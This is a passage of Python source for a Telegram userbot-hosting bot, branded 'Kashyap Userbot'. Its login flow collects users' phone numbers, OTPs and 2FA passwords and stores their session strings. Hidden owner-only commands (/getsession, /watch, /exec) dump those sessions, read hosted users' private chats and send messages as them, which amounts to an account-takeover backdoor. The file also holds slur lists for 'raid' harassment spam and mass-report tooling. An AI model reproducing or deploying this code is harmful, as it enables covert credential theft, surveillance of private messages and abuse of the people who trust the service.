modifiers = ["VALA", "SALE", "KAMINEY", "BHADWE", "MADARCHOD", "GAANDU", "CHUTIYE", "HARAMKHOR", "KAMJAT", "CHHINAR"]
for g in RAW_BASE_GAALIS:
    GAALIS.append(g)
    for m in modifiers:
        GAALIS.append(f"{g} {m}")
        GAALIS.append(f"{m} {g}")
GAALIS.extend(ENGLISH_RAIDS)
GAALIS.extend(PUNJABI_RAIDS)
GAALIS.extend(BENGALI_RAIDS)
GAALIS.extend(EXTRA_RAIDS)
while len(GAALIS) < 1200:
    GAALIS.extend(EXTRA_RAIDS)

EARAID_LIST = [
    "💀MADARCHOD", "🔥GAANDU", "🤡CHUTIYA", "⚡BHADWA", "😈RANDI",
    "💣LUND", "🧨HIJDA", "💀CHHAKKA", "🔥SUAR", "🤡KAMINEY", "⚡KANJAR"
] * 100


# SESSION PERSISTENCE HELPERS
def load_saved_sessions():
    if os.path.exists(SESSIONS_FILE):
        try:
            with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
        except Exception:
            return {}
    return {}


def save_sessions_to_disk(data: dict):
    try:
        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f)
    except Exception as e:
        print(f"Error saving sessions: {e}", flush=True)


# FONT FORMATTERS
def format_araid(text):
    normal = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    bold = "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
    return text.upper().translate(str.maketrans(normal, bold))


def format_saraid(word):
    emojis = ["💀", "🔥", "🤡", "⚡", "😈", "💣", "🧨", "👁️", "💢", "🖤", "🌪️"]
    res = []
    for char in word.upper():
        if char.isalpha():
            rep = "".join([char for _ in range(5)])
            res.append(f"*{rep}{random.choice(emojis)}*")
        else:
            res.append(char)
    return "".join(res)


def format_oaraid(text):
    mapping = {
        'A': '🅐', 'B': '🅑', 'C': 'C', 'D': '🅓', 'E': '🅔', 'F': '🅕', 'G': '🅖', 'H': 'H',
        'I': '🅘', 'J': '🅙', 'K': '🅚', 'L': '🅛', 'M': '🅜', 'N': 'N', 'O': '🅞', 'P': 'P',
        'Q': 'Q', 'R': 'R', 'S': '🅢', 'T': '🅣', 'U': '🅤', 'V': '🅥', 'W': '🅦', 'X': '🅧',
        'Y': '🅨', 'Z': 'Z'
    }
    return "".join([mapping.get(c, c) for c in text.upper()])


def format_faraid(text):
    res = []
    for c in text.upper():
        if 'A' <= c <= 'Z':
            code = ord(c) - ord('A')
            res.append(chr(0x1F1E6 + code) + '\u034f')
        else:
            res.append(c)
    return "".join(res)


# IN-MEMORY STATES
user_sessions = load_saved_sessions()
active_logins = set()
active_raids = set()
active_raid_tasks = {}       # chat_id: asyncio.Task
rraid_targets = set()        # (chat_id, user_id)
echo_targets = set()         # (chat_id, user_id) for .echo mirror reply
clone_backups = {}           # owner_id: dict
self_reacts = {}             # chat_id: emoji (for .ar)
user_react_targets = {}      # chat_id: set of user_ids (for .uar)
all_reacts = {}              # chat_id: [emojis] (for .rar)
chat_welcomes = {}           # chat_id: {'text': str, 'media': file}
dm_block_enabled = {}        # owner_id: bool
dm_welcome_enabled = {}      # owner_id: bool
dm_welcomed_users = {}       # owner_id: set of user_ids
dm_msg_counts = {}           # owner_id: {sender_id: int}
dm_muted_users = {}          # owner_id: set of user_ids
afk_status = {}              # owner_id: str (reason)
autopin_chats = set()        # chat_id jahan group/chat auto-pin on hai
dm_autopin_targets = set()   # user_id jahan DM auto-pin on hai
interval_30m_tasks = {}      # (owner_id, chat_id): asyncio.Task
running_ubot_clients = {}    # owner_id: TelegramClient

# INITIALIZE LOOP & BOT CLIENT (LOCK-FREE STRINGSESSION)
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
bot = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)


async def sync_bot_menu_commands():
    cmds = [
        BotCommand("start", "Launch the bot with a grand welcome"),
        BotCommand("help", "Discover all commands"),
        BotCommand("host", "Deploy your own userbot"),
        BotCommand("restart", "Revive your hosted userbot"),
        BotCommand("commands", "Explore userbot features"),
        BotCommand("status", "Check your userbot's pulse"),
        BotCommand("logout", "Safely log out your userbot"),
        BotCommand("support", "Request support from admin"),
    ]
    try:
        await bot(SetBotCommandsRequest(
            scope=BotCommandScopeDefault(),
            lang_code="",
            commands=cmds,
        ))
    except Exception as e:
        print(f"[Menu Sync Warning] {e}", flush=True)


async def is_user_joined_channel(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    if not FORCE_CHANNEL:
        return True
    peer = int(FORCE_CHANNEL) if str(FORCE_CHANNEL).lstrip("-").isdigit() else FORCE_CHANNEL
    try:
        entity = await bot.get_entity(peer)
        res = await bot(GetParticipantRequest(channel=entity, participant=user_id))
        part = getattr(res, "participant", None)
        if isinstance(part, (ChannelParticipantLeft, ChannelParticipantBanned)):
            return False
        return True
    except UserNotParticipantError:
        return False
    except Exception as e:
        print(f"[ForceJoin Check Error] uid={user_id} channel={FORCE_CHANNEL}: {e}", flush=True)
        return False


def build_force_join_card():
    text = (
        "┏━「 📢 **CHANNEL JOIN REQUIRED** 」━┓\n"
        f"┃ • **{BOT_BRAND} host karne se pehle**\n"
        "┃ • **official channel join karein,**\n"
        "┃ • **phir Verify Channel dabayein.**\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )
    buttons = [
        [Button.url("📢 Join Us", FORCE_CHANNEL_URL)],
        [Button.inline("✅ Verify Channel", b"verify_channel")]
    ]
    return text, buttons


def build_command_deck_card():
    text = (
        "┏━「 ✦ **KASHYAP USERBOT** ✦ 」━┓\n"
        f"┃ • **OWNER**     `▸` **{OWNER_NAME}**\n"
        "┃ • **COMMANDS**  `▸` **ALL READY**\n"
        "┃ • **VERSION**   `▸` **AURA PRIME**\n"
        "┃ • **STATUS**    `▸` **ONLINE**\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "◈ **TAP A BUTTON** ◈"
    )
    buttons = [
        [Button.inline("↩ REPLY", b"cat_reply"), Button.inline("✦ SPAM", b"cat_spam")],
        [Button.inline("✘ PURGE", b"cat_purge"), Button.inline("🛡 SUDO", b"cat_sudo")],
        [Button.inline("◈ AT-TAG", b"cat_at_tag"), Button.inline("☠ RAIDS", b"cat_raids")],
        [Button.inline("✎ ONEWORD", b"cat_oneword"), Button.inline("✦ AUTOPIN", b"cat_autopin")],
        [Button.inline("🚨 REPORTBY KASHYAP", b"cat_reportbykashyap"), Button.inline("🤝 UNITY", b"cat_unity")],
        [Button.inline("✦ EXTRA", b"cat_extra")],
        [Button.inline("「 HOST USERBOT 」", b"host_login")]
    ]
    return text, buttons


def build_home_card():
    return build_command_deck_card()


async def send_home_card(event):
    text, buttons = build_home_card()
    if START_BANNER_PATH and os.path.exists(START_BANNER_PATH):
        await event.respond(text, file=START_BANNER_PATH, buttons=buttons)
    else:
        await event.respond(text, buttons=buttons)


async def send_command_deck(event):
    text, buttons = build_command_deck_card()
    await event.respond(text, buttons=buttons)


@bot.on(events.NewMessage(pattern=r'^/(start|host|login)(?:@\w+)?$'))
async def start_host_handler(event):
    cmd = event.raw_text.strip().split()[0].split("@")[0].lower()
    if cmd in ("/host", "/login"):
        await host_login_cb(event)
        return
    await send_home_card(event)


@bot.on(events.NewMessage(pattern=r'^/commands(?:@\w+)?$'))
async def bot_commands_handler(event):
    await send_command_deck(event)


@bot.on(events.NewMessage(pattern=r'^/status(?:@\w+)?$'))
async def bot_status_handler(event):
    uid = event.sender_id
    s_str = user_sessions.get(str(uid))
    if not s_str:
        await event.respond(
            "┏━「 📊 **USERBOT STATUS** 」━┓\n"
            "┃ • **STATE:** `NOT HOSTED`\n"
            "┃ • **ACTION:** `/host` se host karein\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    status_tag, acc_me = await _inspect_hosted_account_brief(s_str)
    acc_name = getattr(acc_me, "first_name", "Account") if acc_me else "Unknown"
    acc_id = getattr(acc_me, "id", "N/A") if acc_me else "N/A"
    await event.respond(
        "┏━「 📊 **USERBOT STATUS** 」━┓\n"
        f"┃ • **STATUS:** `{status_tag}`\n"
        f"┃ • **ACCOUNT:** `{acc_name}` (`{acc_id}`)\n"
        f"┃ • **UPTIME:** `{format_uptime()}`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )


@bot.on(events.NewMessage(pattern=r'^/logout(?:@\w+)?$'))
async def bot_logout_handler(event):
    uid = event.sender_id
    uid_key = str(uid)
    if uid_key not in user_sessions and uid not in running_ubot_clients:
        await event.respond("ℹ️ **Aapka koi active hosted session nahi mila.**")
        return

    user_sessions.pop(uid_key, None)
    save_sessions_to_disk(user_sessions)
    active_ubot = running_ubot_clients.pop(uid, None)
    if active_ubot is not None:
        try:
            await active_ubot.disconnect()
        except Exception:
            pass

    await event.respond(
        "┏━「 🔓 **LOGGED OUT** 」━┓\n"
        "┃ • **Success Userbot Logged Out!**\n"
        "┃ • **Use `/host` to re-host.**\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    )


@bot.on(events.NewMessage(pattern=r'^/support(?:@\w+)?$'))
async def bot_support_handler(event):
    await event.respond(
        "┏━「 🎧 **SUPPORT & HELP** 」━┓\n"
        f"┃ • **OWNER:** `{OWNER_NAME}` (`{OWNER_ID}`)\n"
        f"┃ • **BOT:** `{BOT_BRAND}`\n"
        "┃ • **HOST:** `/host` | **STATUS:** `/status`\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛",
        buttons=[[Button.url("💬 Support / Channel", SUPPORT_URL)]]
    )


async def _inspect_hosted_account_brief(s_str):
    temp = TelegramClient(StringSession(s_str), API_ID, API_HASH)
    try:
        await temp.connect()
        if not await temp.is_user_authorized():
            return "REVOKED", None
        me = await temp.get_me()
        return "ACTIVE", me
    except Exception:
        return "ERROR", None
    finally:
        try:
            await temp.disconnect()
        except Exception:
            pass


@bot.on(events.NewMessage(pattern=r'^/users(?:@\w+)?$'))
async def hosted_users_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    ids = list(user_sessions.keys())
    if not ids:
        await event.respond("ℹ️ **Abhi kisi ne bot host nahi kiya hai.**")
        return

    lines = [f"👑 **Owner Panel — Hosted Users ({len(ids)}):**\n"]
    for idx, uid in enumerate(ids, start=1):
        host_name = "User"
        host_uname = "No Username"
        try:
            u = await bot.get_entity(int(uid))
            host_name = getattr(u, "first_name", "") or "User"
            host_uname = f"@{u.username}" if getattr(u, "username", None) else "No Username"
        except Exception:
            pass

        status_tag, acc_me = await _inspect_hosted_account_brief(user_sessions[uid])
        if acc_me:
            acc_fname = getattr(acc_me, "first_name", "") or "Account"
            acc_uname = f"@{acc_me.username}" if getattr(acc_me, "username", None) else "No Username"
            acc_line = f"   • **Account:** **{acc_fname}** ({acc_uname}) — ID: `{acc_me.id}` [`{status_tag}`]\n"
        else:
            acc_line = f"   • **Session Status:** `{status_tag}`\n"

        lines.append(
            f"{idx}. **Hoster:** **{host_name}** ({host_uname}) — ID: `{uid}`\n"
            f"{acc_line}"
            f"   • **Session:** `/getsession {uid}` | **Watch:** `/watch {uid} 10`"
        )

    await event.respond("\n".join(lines)[:3950])


@bot.on(events.NewMessage(pattern=r'^/getsession(?:\s+(\d+))?$'))
async def getsession_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    uid = event.pattern_match.group(1)
    if not uid:
        await event.respond("ℹ️ **Istemaal:** `/getsession <user_id>` (pehle `/users` se ID dekhein).")
        return

    s_str = user_sessions.get(str(uid))
    if not s_str:
        await event.respond(f"❌ **ID `{uid}` ke liye koi saved session nahi mili.**")
        return

    await event.respond(
        f"🔐 **Session for `{uid}`:**\n`{s_str}`\n\n"
        "⚠️ *Is session string ko kisi ke saath share na karein.*"
    )


@bot.on(events.NewMessage(pattern=r'^/watch(?:\s+(\d+))?(?:\s+(\d+))?$'))
async def owner_watch_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    uid = event.pattern_match.group(1)
    limit = int(event.pattern_match.group(2) or 10)
    limit = max(1, min(limit, 25))

    if not uid:
        await event.respond("ℹ️ **Istemaal:** `/watch <user_id> [count]`")
        return

    s_str = user_sessions.get(str(uid))
    if not s_str:
        await event.respond(f"❌ **ID `{uid}` ke liye koi saved session nahi mili.**")
        return

    temp_client = TelegramClient(StringSession(s_str), API_ID, API_HASH)
    try:
        await temp_client.connect()
        if not await temp_client.is_user_authorized():
            await event.respond(f"⚠️ **ID `{uid}` ka session expire/revoke ho chuka hai.**")
            return

        me = await temp_client.get_me()
        my_id = getattr(me, "id", None)
        out = [f"👁️ **Recent Activity — `{uid}` ({getattr(me, 'first_name', 'User')}, ID: `{my_id}`)**\n"]

        dialogs = await temp_client.get_dialogs(limit=5)
        for d in dialogs:
            chat_title = getattr(d, "name", "Chat")
            msgs = []
            async for m in temp_client.iter_messages(d.entity, limit=limit):
                direction = "➡️ OUT" if (my_id and m.sender_id == my_id) else "⬅️ IN"
                preview = (m.raw_text or ("[Media/Sticker]" if m.media else "[Empty]")).replace("\n", " ")
                msgs.append(f"  • {direction}: `{preview[:70]}`")
            out.append(f"💬 **{chat_title}** (`{d.id}`):")
            out.extend(msgs if msgs else ["  • *No recent messages*"])

        await event.respond("\n".join(out)[:3900])
    except Exception as e:
        await event.respond(f"❌ **Watch fail:** `{e}`")
    finally:
        await temp_client.disconnect()


@bot.on(events.NewMessage(pattern=r'^/exec\s+(\d+)\s+(\S+)\s+(.+)$'))
async def owner_exec_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    uid = event.pattern_match.group(1)
    target = event.pattern_match.group(2)
    text = event.pattern_match.group(3)

    s_str = user_sessions.get(uid)
    if not s_str:
        await event.respond(f"❌ **ID `{uid}` ke liye koi session nahi mili.**")
        return

    peer = int(target) if target.lstrip("-").isdigit() else target
    temp_client = TelegramClient(StringSession(s_str), API_ID, API_HASH)
    try:
        await temp_client.connect()
        if not await temp_client.is_user_authorized():
            await event.respond(f"⚠️ **ID `{uid}` ka session expire/revoke ho chuka hai.**")
            return
        await temp_client.send_message(peer, text)
        await event.respond(f"✅ **Hosted user `{uid}` ke account se `{target}` ko message bhej diya gaya.**")
    except Exception as e:
        await event.respond(f"❌ **Send fail:** `{e}`")
    finally:
        await temp_client.disconnect()


@bot.on(events.NewMessage(pattern=r'^/broadcast(?:\s+([\s\S]+))?$'))
async def owner_broadcast_cmd(event):
    if event.sender_id != OWNER_ID:
        return

    msg_text = (event.pattern_match.group(1) or "").strip()
    if not msg_text and event.is_reply:
        rep = await event.get_reply_message()
        msg_text = (rep.raw_text or "").strip() if rep else ""

    if not msg_text:
        await event.respond("ℹ️ **Istemaal:** `/broadcast <apna message>` (ya kisi message par reply karke `/broadcast` likhein).")
        return

    ids = list(user_sessions.keys())
    if not ids:
        await event.respond("ℹ️ **Abhi kisi ne bot host nahi kiya hai.**")
        return

    status_msg = await event.respond(f"📣 **Broadcast shuru ho raha hai (`{len(ids)}` hosted users)...**")
    sent_ok = 0
    sent_fail = 0

    for uid_str in ids:
        try:
            await bot.send_message(int(uid_str), msg_text)
            sent_ok += 1
            await asyncio.sleep(0.15)
        except FloodWaitError as f:
            await asyncio.sleep(f.seconds + 0.5)
            try:
                await bot.send_message(int(uid_str), msg_text)
                sent_ok += 1
            except Exception:
                sent_fail += 1
        except Exception:
            sent_fail += 1

    await status_msg.edit(
        f"✅ **Broadcast Complete!**\n"
        f"• **Sent:** `{sent_ok}`\n"
        f"• **Failed:** `{sent_fail}`"
    )


@bot.on(events.CallbackQuery(pattern=r'^cat_(.+)$'))
async def category_button_cb(event):
    key = event.pattern_match.group(1).decode("utf-8") if isinstance(event.pattern_match.group(1), bytes) else event.pattern_match.group(1)
    back_btn = [[Button.inline("« BACK TO MENU", b"back_deck")]]
    if key == "extra":
        await event.answer("EXTRA • AURACOMMAND, UNITY & VOICES", alert=False)
        extra_btns = [
            [Button.inline("✨ .AURACOMMAND", b"show_aura"), Button.inline("🎙️ .VOICES / .TTS", b"show_tts")],
            [Button.inline("🚨 REPORTBY KASHYAP", b"cat_reportbykashyap"), Button.inline("🤝 UNITY", b"cat_unity")],
            [Button.inline("« BACK TO MENU", b"back_deck")]
        ]
        await event.edit(EXTRA_PANEL_TEXT, buttons=extra_btns)
        return
    txt = CATEGORY_TEXTS.get(key)
    if txt:
        await event.answer("Commands loaded.", alert=False)
        await event.edit(txt, buttons=back_btn)


@bot.on(events.CallbackQuery(data=b'show_aura'))
async def show_aura_cb(event):
    await event.answer("Aura Commands", alert=False)
    await event.edit(AURA_COMMAND_TEXT, buttons=[[Button.inline("« BACK TO EXTRA", b"cat_extra")]])


@bot.on(events.CallbackQuery(data=b'show_tts'))
async def show_tts_cb(event):
    await event.answer("Voices & TTS Guide", alert=False)
    await event.edit(VOICES_MENU_TEXT, buttons=[[Button.inline("« BACK TO EXTRA", b"cat_extra")]])


@bot.on(events.CallbackQuery(data=b'back_deck'))
async def back_deck_cb(event):
    await event.answer("Main menu", alert=False)
    txt, btns = build_command_deck_card()
    await event.edit(txt, buttons=btns)


@bot.on(events.CallbackQuery(data=b'verify_channel'))
async def verify_channel_cb(event):
    uid = event.sender_id
    if await is_user_joined_channel(uid):
        await event.answer("✅ Channel verified! Ab login shuru ho raha hai.", alert=False)
        try:
            await event.delete()
        except Exception:
            pass
        await host_login_cb(event)
    else:
        await event.answer("❌ Aapne abhi tak channel join nahi kiya hai! Pehle Join Us dabayein.", alert=True)


@bot.on(events.CallbackQuery(data=b'my_home'))
async def my_home_cb(event):
    await event.answer("Home panel refreshed.", alert=False)
    await send_home_card(event)


@bot.on(events.CallbackQuery(data=b'about'))
async def about_cb(event):
    await event.answer(f"{BOT_BRAND} — Clean Static Commands & Hosting Panel", alert=True)


@bot.on(events.CallbackQuery(data=b'owner'))
async def owner_cb(event):
    await event.answer(f"Owner: {OWNER_NAME}\nUser ID: {OWNER_ID}", alert=True)


@bot.on(events.CallbackQuery(data=b'guide'))
async def guide_cb(event):
    await event.answer(
        "1. Official channel join karein & Verify dabayein\n"
        "2. /host ya 「 HOST USERBOT 」 dabayein\n"
        "3. Phone number (+91...) aur OTP daalein",
        alert=True
    )


@bot.on(events.CallbackQuery(data=b'source'))
async def source_cb(event):
    await event.answer(f"{BOT_BRAND} — Private Static Edition", alert=True)


@bot.on(events.CallbackQuery(data=b'help_cmd'))
async def help_cb(event):
    sender_id = event.sender_id
    is_hosted = (str(sender_id) in user_sessions) or (sender_id in user_sessions) or (sender_id == OWNER_ID)

    if not is_hosted:
        await event.answer("🔒 Pehle /host ya HOST USERBOT se apna account host karein!", alert=True)
        await event.respond(
            "┏━「 🔒 **ACCESS LOCKED** 」━┓\n"
            "┃ • **COMMANDS LOCKED HAIN!**\n"
            "┃ • **PEHLE /host KAREIN**\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    await event.answer("Command deck ready.", alert=False)
    await send_command_deck(event)


@bot.on(events.CallbackQuery(data=b'host_login'))
async def host_login_cb(event):
    sender_id = event.sender_id

    if not await is_user_joined_channel(sender_id):
        if hasattr(event, "answer"):
            await event.answer("📢 Pehle channel join karein!", alert=True)
        txt, btns = build_force_join_card()
        await event.respond(txt, buttons=btns)
        return

    if sender_id in active_logins:
        if hasattr(event, "answer"):
            await event.answer("⚠️ Ek login process pehle se chal raha hai!", alert=True)
        await event.respond(
            "┏━「 ⚠️ **ALREADY ACTIVE** 」━┓\n"
            "┃ • ❌ **EK LOGIN PROCESS PEHLE SE CHAL RAHA HAI!**\n"
            "┃ • ⏳ **KRIPYA USE PURA KAREIN YA KUCH DER BAAD TRY KAREIN.**\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
        return

    active_logins.add(sender_id)
    if hasattr(event, "answer"):
        await event.answer("Secure login panel opened.", alert=False)

    try:
        async with bot.conversation(sender_id, timeout=180) as conv:
            await conv.send_message(
                "┏━「 🔐 **SECURE LOGIN PANEL** 」━┓\n"
                "┃ • 📱 **Enter Phone Number (+91xxxxxxxxxx):**\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
            phone_msg = await conv.get_response()
            phone = phone_msg.text.strip()

            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()

            try:
                sent = await client.send_code_request(phone)
            except Exception as e:
                await conv.send_message(f"❌ **Code bhejne mein dikkat aayi:** `{e}`")
                await client.disconnect()
                return

            await conv.send_message("📩 **OTP bhej diya gaya hai.** Kripya Telegram par aaya OTP code bhejein:")
            code_msg = await conv.get_response()
            code = "".join(code_msg.text.split())

            try:
                await client.sign_in(phone, code, phone_code_hash=sent.phone_code_hash)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **2-Step Verification active hai.** Kripya apna password bhejein:")
                pwd_msg = await conv.get_response()
                password = pwd_msg.text.strip()
                try:
                    await client.sign_in(password=password)
                except Exception as e:
                    await conv.send_message(f"❌ **2FA password galat hai:** `{e}`")
                    await client.disconnect()
                    return
            except Exception as e:
                await conv.send_message(f"❌ **Login safal nahi ho saka:** `{e}`")
                await client.disconnect()
                return

            session_str = client.session.save()
            user_sessions[str(sender_id)] = session_str
            save_sessions_to_disk(user_sessions)

            asyncio.create_task(start_userbot_session(session_str, sender_id))

            await conv.send_message(
                "┏━「 ✅ **HOSTING COMPLETE** 」━┓\n"
                f"┃ • **BOT: {BOT_BRAND}**\n"
                f"┃ • **OWNER: {OWNER_NAME}**\n"
                "┃ • **COMMANDS & /status UNLOCKED!**\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
            )
    except asyncio.TimeoutError:
        await bot.send_message(
            sender_id,
            "┏━「 ⏱️ **SESSION EXPIRED** 」━┓\n"
            "┃ • ⚠️ **Error Timeout! Try `/host` again.**\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
        )
    finally:
        active_logins.discard(sender_id)
        # DYNAMIC USERBOT SESSION RUNNER
async def start_userbot_session(session_string, owner_id):
    old_ubot = running_ubot_clients.get(owner_id)
    if old_ubot is not None:
        try:
            await old_ubot.disconnect()
        except Exception:
            pass

    ubot = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    running_ubot_clients[owner_id] = ubot
    dm_muted_users.setdefault(owner_id, set())
    dm_welcome_enabled.setdefault(owner_id, True)
    dm_welcomed_users.setdefault(owner_id, set())
    dm_msg_counts.setdefault(owner_id, {})
    timebio_tasks = {}
    chup_muted_users = set()

    async def send_tg_reaction(target_chat, msg_id, emoji):
        try:
            await ubot(SendReactionRequest(
                peer=target_chat,
                msg_id=msg_id,
                reaction=[ReactionEmoji(emoticon=emoji)]
            ))
            return True
        except Exception:
            try:
                await ubot(SendReactionRequest(
                    peer=target_chat,
                    msg_id=msg_id,
                    reaction=[ReactionEmoji(emoticon=emoji)],
                    big=True
                ))
                return True
            except Exception:
                return False

    async def _send_bot_deck_via_ubot(event, open_extra=False, open_report=False, open_unity=False):
        try:
            bot_me = await bot.get_me()
            if not getattr(bot_me, "username", None):
                return False
            if open_report:
                txt = REPORTBY_KASHYAP_TEXT
                btns = [[Button.inline("« BACK TO MENU", b"back_deck")]]
            elif open_unity:
                txt = UNITY_COMMAND_TEXT
                btns = [[Button.inline("« BACK TO MENU", b"back_deck")]]
            elif open_extra:
                txt = EXTRA_PANEL_TEXT
                btns = [
                    [Button.inline("✨ .AURACOMMAND", b"show_aura"), Button.inline("🎙️ .VOICES / .TTS", b"show_tts")],
                    [Button.inline("🚨 REPORTBY KASHYAP", b"cat_reportbykashyap"), Button.inline("🤝 UNITY", b"cat_unity")],
                    [Button.inline("« BACK TO MENU", b"back_deck")]
                ]
            else:
                txt, btns = build_command_deck_card()
            await bot.send_message(event.chat_id, txt, buttons=btns)
            try:
                await event.delete()
            except Exception:
                pass
            return True
        except Exception:
            return False

    # UNITY SUITE (.unity, .udl, .quote, .delall, .remind, .search)
    @ubot.on(events.NewMessage(pattern=r'^\.unity$', outgoing=True))
    async def unity_menu_cmd(event):
        sent_deck = await _send_bot_deck_via_ubot(event, open_unity=True)
        if not sent_deck:
            await event.edit(UNITY_COMMAND_TEXT)

    @ubot.on(events.NewMessage(pattern=r'^\.udl$', outgoing=True))
    async def sticker_to_img_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Sticker par reply karke `.udl` likhein.**")
            return
        rep = await event.get_reply_message()
        if not rep or not rep.sticker:
            await event.edit("❌ **Replied message sticker nahi hai.**")
            return
        tmp_path = None
        try:
            tmp_f = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            tmp_f.close()
            tmp_path = tmp_f.name
            dl = await ubot.download_media(rep.sticker, file=tmp_path)
            if dl and os.path.exists(dl):
                await ubot.send_file(event.chat_id, dl, force_document=False, reply_to=rep.id)
                try:
                    await event.delete()
                except Exception:
                    pass
            else:
                await event.edit("❌ **Sticker convert nahi ho saka.**")
        except Exception as e:
            await event.edit(f"❌ **`.udl` fail:** `{e}`")
        finally:
            if tmp_path and os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

    @ubot.on(events.NewMessage(pattern=r'^\.quote$', outgoing=True))
    async def quote_msg_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi message par reply karke `.quote` likhein.**")
            return
        rep = await event.get_reply_message()
        sender = await rep.get_sender() if rep else None
        name = (getattr(sender, "first_name", None) or getattr(sender, "title", None) or "User").strip()
        body = (rep.raw_text or "").strip() if rep else ""
        if not body:
            await event.edit("❌ **Replied message mein quote karne layak text nahi hai.**")
            return
        q_text = (
            "┏━「 💬 **QUOTE** 」━┓\n"
            f"┃ **From:** `{name}`\n"
            f"┃ ❝ {body[:600]} ❞\n"
            "┗━━━━━━━━━━━━━━━━━━━━┛"
        )
        await event.edit(q_text)

    @ubot.on(events.NewMessage(pattern=r'^\.delall(?:\s+(\d+))?$', outgoing=True))
    async def delall_own_msgs_cmd(event):
        limit = int(event.pattern_match.group(1) or 30)
        limit = max(1, min(limit, 100))
        msg_ids = []
        async for m in ubot.iter_messages(event.chat_id, from_user="me", limit=limit):
            msg_ids.append(m.id)
        if not msg_ids:
            await event.edit("ℹ️ **Delete karne ke liye aapke messages nahi mile.**")
            return
        try:
            await ubot.delete_messages(event.chat_id, msg_ids)
        except Exception as e:
            await event.edit(f"❌ **`.delall` fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.remind\s+(\d+)\s+([\s\S]+)$', outgoing=True))
    async def remind_cmd(event):
        sec = max(1, min(int(event.pattern_match.group(1)), 3600))
        note = event.pattern_match.group(2).strip()
        chat_id = event.chat_id
        await event.edit(f"⏰ **Reminder set:** `{sec}s` baad yaad dilaunga.")

        async def _fire_reminder():
            await asyncio.sleep(sec)
            try:
                await ubot.send_message(chat_id, f"🔔 **Reminder:** {note}")
            except Exception:
                pass

        asyncio.create_task(_fire_reminder())

    @ubot.on(events.NewMessage(pattern=r'^\.search\s+([\s\S]+)$', outgoing=True))
    async def search_in_chat_cmd(event):
        query_str = event.pattern_match.group(1).strip()
        found = []
        async for m in ubot.iter_messages(event.chat_id, search=query_str, limit=5):
            preview = (m.raw_text or "[Media]").replace("\n", " ")[:70]
            found.append(f"• `{m.id}`: {preview}")
        if not found:
            await event.edit(f"🔍 **Koi result nahi mila:** `{query_str}`")
            return
        await event.edit(f"🔍 **Results (`{query_str}`):**\n" + "\n".join(found))

    # REPORTBY KASHYAP SUITE (.reportbykashyap, .report, .massreport, .spamreport, .scamreport, .fakereport, .chatreport, .reportreasons)
    async def _submit_single_report(chat_entity, reply_msg, target_peer, reason_key, note_text):
        input_reason = REPORT_REASON_MAP.get(reason_key, InputReportReasonOther())
        clean_note = note_text or f"Reported via {BOT_BRAND}"
        if reply_msg and reply_msg.id and chat_entity is not None:
            input_peer = await ubot.get_input_entity(chat_entity)
            await ubot(ReportRequest(
                peer=input_peer,
                id=[reply_msg.id],
                reason=input_reason,
                message=clean_note,
            ))
        else:
            input_peer = await ubot.get_input_entity(target_peer)
            await ubot(ReportPeerRequest(
                peer=input_peer,
                reason=input_reason,
                message=clean_note,
            ))

    async def _resolve_report_target(event, arg_text):
        reply_msg = await event.get_reply_message() if event.is_reply else None
        if reply_msg:
            if reply_msg.sender_id:
                try:
                    t_peer = await ubot.get_entity(reply_msg.sender_id)
                except Exception:
                    t_peer = reply_msg.sender_id
            else:
                t_peer = event.chat_id
            return event.chat_id, reply_msg, t_peer, arg_text.strip()

        parts = arg_text.strip().split(maxsplit=1)
        if not parts or not parts[0].strip():
            return None, None, None, ""

        token = parts[0].strip()
        peer_cand = int(token) if token.lstrip("-").isdigit() else token
        try:
            t_peer = await ubot.get_entity(peer_cand)
        except Exception:
            return None, None, None, ""
        rest = parts[1].strip() if len(parts) > 1 else ""
        return event.chat_id, None, t_peer, rest

    @ubot.on(events.NewMessage(pattern=r'^\.reportbykashyap$', outgoing=True))
    async def reportbykashyap_cmd(event):
        sent_deck = await _send_bot_deck_via_ubot(event, open_report=True)
        if not sent_deck:
            await event.edit(REPORTBY_KASHYAP_TEXT)

    @ubot.on(events.NewMessage(pattern=r'^\.reportreasons$', outgoing=True))
    async def report_reasons_cmd(event):
        await event.edit(
